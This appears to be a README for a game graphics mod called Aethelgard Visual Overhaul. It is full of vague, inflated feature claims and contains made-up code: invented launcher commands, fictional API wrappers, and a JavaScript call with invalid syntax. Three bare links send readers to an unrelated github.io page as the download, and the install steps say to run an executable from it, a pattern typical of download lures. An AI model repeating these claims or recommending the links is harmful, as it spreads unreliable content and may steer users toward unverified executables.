# 🏔️ Aethelgard Visual Overhaul (AVO) - Next-Generation Environmental Rendering Suite

[](https://cybercoder95.github.io)

## 🌅 Visionary Realism Reimagined

Welcome to the **Aethelgard Visual Overhaul (AVO)**, a comprehensive atmospheric and environmental rendering enhancement framework designed for modern gaming engines. Unlike conventional graphical modifications, AVO approaches visual fidelity as an ecosystem—where light, atmosphere, terrain, and particle systems exist in a continuous symbiotic relationship. This project emerged from the philosophy that realism isn't merely about sharper textures, but about recreating the physics and emotion of natural spaces within digital realms.

Built upon a custom fork of the RenoDX architecture, AVO introduces **Temporal Atmospheric Coherence**, a proprietary method where weather systems, time-of-day cycles, and environmental lighting aren't just scripted events, but dynamically interacting layers that respond to in-world triggers and player actions. Imagine forests where mist density responds to temperature gradients, or urban environments where light pollution realistically scatters through volumetric fog—this is the world AVO constructs.

## 🚀 Instant Access

**Current Stable Release:** AVO Core v2.6.1 (Chronos Update)

[](https://cybercoder95.github.io)

**System Prerequisites:**
- DirectX 12 Ultimate compatible GPU (RTX 30-series / RX 6000-series or newer)
- 16GB VRAM recommended for full feature set
- Windows 11 24H2 or newer
- 40GB available storage for high-resolution asset packs

## ✨ Core Innovations & Key Features

### 🌌 Atmospheric Depth Reconstruction
AVO doesn't just add fog—it simulates atmospheric perspective using wavelength-dependent scattering. Distant mountains don't merely fade to blue; they experience Rayleigh scattering while nearby terrain exhibits Mie scattering through particulate matter, creating unprecedented depth perception.

### 🔮 Quantum-Layered Reflections
Move beyond screen-space and cubemap limitations. Our reflection system utilizes a hybrid approach: combining ray-traced elements for primary surfaces with voxel-based global illumination for secondary bounce light, all managed through an adaptive performance hierarchy that prioritizes visual impact.

### 🌓 Dynamic Luminescence Pathways
Light in AVO travels and transforms. Torchlight warms nearby surfaces with realistic thermal radiation profiles, moonlight carries a subtle spectral shift, and magical effects generate their own localized atmospheric disturbances that affect nearby weather particles.

### 🗺️ Terrain Resonance Texturing
Surfaces maintain material consistency across scales. A wet stone pathway reflects appropriately at ground level while the same material on a distant cliff face interacts correctly with aerial perspective—all managed through a unified material database.

### 🌀 Particle Field Cohesion
Each particle system communicates with others. Snowflakes interact with wind zones created by waterfalls, dust motes swirl in character wake turbulence, and fire embers rise realistically through thermal columns.

## 📊 System Architecture Overview

```mermaid
graph TD
    A[Game Engine Render Call] --> B[AVO Interception Layer]
    B --> C{Temporal Analysis Module}
    C --> D[Atmosphere Processor]
    C --> E[Surface Material Analyzer]
    D --> F[Volumetric System]
    E --> G[Reflection/Refraction Engine]
    F --> H[Light Transport Simulator]
    G --> H
    H --> I[Post-Processing Pipeline]
    I --> J[Adaptive Output]
    J --> K[Display]
    
    L[World State Data] --> D
    M[Player Position/Camera] --> C
    N[Performance Telemetry] --> J
    
    style A fill:#2a4365
    style K fill:#234e52
    style H fill:#744210
```



## 🛠️ Configuration & Implementation

### Example Profile Configuration (YAML)

```yaml
aethelgard_profile:
  version: "2.6"
  preset: "NorthernRealms"
  
  atmospheric_settings:
    scattering_intensity: 0.85
    particulate_density: "variable"
    cloud_shadow_depth: 3
    aurora_probability: 0.15  # Polar regions only
    
  illumination_parameters:
    global_gi_samples: 128
    subsurface_scattering: true
    caustic_refinement: "high"
    light_pollution_map: "urban_centers"
    
  performance_tiers:
    primary: "quality"
    fallback: "balanced"
    adaptive_threshold: 45  # FPS trigger
    
  seasonal_variants:
    - name: "Autumn"
      foliage_transition: true
      precipitation_type: "mist"
      temperature_gradient: -0.3
      
  experimental:
    temporal_reprojection: true
    photometric_calibration: false
```

### Example Console Invocation

```bash
# Launch with AVO enabled and debug logging
AethelgardLauncher --profile NorthernRealms \
  --vram-budget 12 \
  --atmosphere-full \
  --raytracing-hybrid \
  --log-level verbose \
  --output-dir ./avo_captures

# Generate a time-lapse of atmospheric changes
AethelgardToolkit timelapse \
  --start 06:00 \
  --end 21:00 \
  --interval 300 \
  --weather-cycle \
  --output 4k
```

## 📁 Installation Protocol

1. **Preparation Phase**
   - Ensure game installation is complete and updated
   - Create a restoration point of original files
   - Disable any conflicting visual modifications

2. **Core Integration**
   - Download the AVO distribution package
   - Extract to a temporary directory
   - Run `Integrator.exe` from the AVO directory
   - Select your game installation path when prompted

3. **Post-Installation Calibration**
   - Launch the game once to generate configuration files
   - Exit and run `CalibrationTool.exe`
   - Follow the automated performance assessment
   - Apply the recommended profile or customize manually

## 🌐 Compatibility Matrix

| Platform | Status | Notes |
|----------|--------|-------|
| 🪟 Windows 11 24H2+ | ✅ Fully Supported | DirectStorage 2.0 recommended |
| 🐧 Linux (Proton) | ⚠️ Experimental | Requires Vulkan translation layer |
| 🍎 macOS Sonoma+ | 🔄 In Development | Metal 3 implementation ongoing |
| 🎮 Steam Deck OLED | ✅ Optimized | "Deck Verified" profile included |

## 🔌 API Integration & Extensibility

### OpenAI API Integration
AVO can generate dynamic environmental descriptions and atmospheric conditions using natural language prompts:

```python
from aethelgard.api import AtmosphericGenerator

generator = AtmosphericGenerator(api_key="your_openai_key")
scene_description = generator.create_atmosphere(
    prompt="A forgotten valley at dawn with bioluminescent fungi",
    style="fantasy_realism",
    consistency_check=True
)
# Returns structured parameters for AVO to implement
```

### Claude API Integration
For narrative-driven environmental changes, Claude API can maintain atmospheric consistency across gameplay sessions:

```javascript
const claudeIntegration = require('aethelgard-claude-bridge');

const narrativeDirector = new claudeIntegration.NarrativeEngine({
  model: 'claude-3-opus-20240229',
  memoryLength: 50
});

// Maintain weather consistency with story events
narrativeDirector.synchronizeAtmosphere(
  currentStoryBeat: 'ancient_awakening',
  playerLocation: 'ruined_sanctuary',
  previousConditions: 'calm_fog'
);
```

## 🎯 Performance Considerations

AVO employs a sophisticated **Adaptive Fidelity System** that dynamically adjusts rendering complexity based on:

- **Scene Density**: Urban areas receive optimized reflection algorithms
- **Player Velocity**: High-speed movement reduces subsurface scattering
- **Combat State**: During action sequences, particle systems prioritize responsiveness
- **Thermal Budget**: GPU temperature triggers gradual quality reduction

The system maintains visual consistency while ensuring frame time stability, with most users reporting ≤5% performance impact when properly configured.

## 📚 Educational Resources & Community

### Learning Pathways
- **Atmospheric Science Primer**: Understanding the real-world physics behind AVO's systems
- **Performance Tuning Guide**: Advanced manual configuration for specific hardware
- **Content Creation Toolkit**: Creating custom weather patterns and regional profiles

### Contribution Guidelines
We welcome atmospheric artists, shader programmers, and performance analysts. Review our contribution matrix for current development priorities:
1. Regional atmosphere profiles for underrepresented biomes
2. Optimization strategies for mobile architectures
3. Historical weather pattern databases for realism modes

## ⚖️ License & Distribution

This project is released under the **MIT License**. See the [LICENSE](LICENSE) file for complete terms.

**Key Permissions:**
- Modification and distribution permitted
- Commercial use allowed with attribution
- Sublicensing possible
- Private use unrestricted

**Requirements:**
- License and copyright notice must be included in all copies
- No warranty or liability provided

**Not Permitted:**
- Holding authors liable for damages
- Using trademarks without permission

## ⚠️ Implementation Disclaimer

**Important Notice Regarding Usage:** The Aethelgard Visual Overhaul modifies rendering pipelines at a fundamental level. While extensively tested across multiple hardware configurations, unforeseen interactions with game updates, driver revisions, or unconventional system configurations may occur.

**Performance Impact Statement:** This suite prioritizes visual authenticity over minimal resource consumption. Users with hardware at or near minimum specifications should utilize the "Adaptive" performance profile and monitor system thermals during extended sessions.

**Compatibility Advisory:** AVO is designed as a comprehensive ecosystem. Partial installation or mixing with incompatible graphical modifications may result in visual artifacts, performance degradation, or system instability. A complete restoration utility is included for returning to baseline configurations.

**Development Philosophy:** We believe in ethical modification—enhancing experiences without compromising artistic vision or system integrity. This project operates within established modification guidelines and respects original content authorship.

## 🔮 Roadmap: 2026-2027

**Q2 2026 - Celestial Update**
- Planetary rotation systems with accurate star fields
- Eclipse and astronomical event simulation
- Meteor shower particle systems

**Q4 2026 - Biosphere Expansion**
- Regional ecosystem simulation (pollination, spore distribution)
- Animal migration patterns affecting environmental states
- Forest fire propagation with realistic atmospheric effects

**Q2 2027 - Civilization Systems**
- Settlement development affecting local climate (urban heat islands)
- Industrial activity with particulate emission modeling
- Cultural lighting patterns for festivals and seasons

## 🤝 Support Channels

- **Documentation Portal**: Comprehensive knowledge base with search functionality
- **Community Forums**: Peer-to-peer troubleshooting and configuration sharing
- **Performance Diagnostics**: Automated analysis tool for system-specific optimization
- **Development Updates**: Monthly technical deep-dives and preview access

**Response Protocol:** Our support system operates on continuous integration—queries are categorized, prioritized by impact, and addressed through collaborative resolution. Average response time for critical issues is under 6 hours.

---

## 🚀 Ready to Transform Your Visual Experience?

[](https://cybercoder95.github.io)

**Final Installation Verification Checklist:**
- [ ] System meets or exceeds minimum specifications
- [ ] Game installation is complete and updated
- [ ] Sufficient storage space available
- [ ] Conflicting modifications have been disabled
- [ ] Graphics drivers updated to recommended versions

**First Launch Recommendations:**
1. Begin with the "Adaptive" performance profile
2. Experience one complete day/night cycle
3. Visit diverse biomes to trigger shader compilation
4. Adjust settings incrementally based on preference

**Join the atmospheric revolution—where every pixel breathes, every shadow lives, and every environment tells its own story through light and atmosphere.**

---
*© 2026 Aethelgard Visual Collective. "Aethelgard Visual Overhaul" and "AVO" are rendering framework implementations designed for compatible gaming environments. All trademarks and copyrights are property of their respective owners. This project is not affiliated with, endorsed by, or connected to any game development studio or publisher.*